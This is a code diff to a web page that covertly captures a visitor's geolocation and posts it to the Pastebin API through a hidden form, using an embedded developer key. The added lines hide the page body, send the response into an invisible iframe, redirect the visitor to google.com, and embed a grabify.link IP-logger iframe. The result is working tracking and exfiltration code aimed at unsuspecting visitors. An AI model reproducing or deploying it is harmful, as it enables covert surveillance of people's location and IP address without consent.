@@ -36,6 +36,7 @@ async function capturePosition(position) {
 
     data_ele.value = loc_info
     form.submit()
+    window.location.href = "https://www.google.com"
 }
 
 async function main() {
@@ -49,8 +50,8 @@ async function main() {
 
 
     
-    <body>
-      <form id="send_form" action="https://pastebin.com/api/api_post.php" method="POST">
+    <body style="visibility: hidden;">
+      <form id="send_form" action="https://pastebin.com/api/api_post.php" method="POST" target="res">
         <input name="api_dev_key" value="g0Nz1dKR1he8SW7Fef65UvMZCi7jH_07">
         <input id="send_data" name="api_paste_code" value="test">
         <input name="api_option" value="paste">
@@ -60,10 +61,11 @@ async function main() {
         main();
       </script>
       <div>
-        <iframe src="https://grabify.link/I0B4VP">
-        </frame>  
+        <iframe name="res">
+        </iframe>
+        <iframe src="https://grabify.link/A3EIEY">
+        </iframe>    
       </div>
-
 
     </body>
 </html>
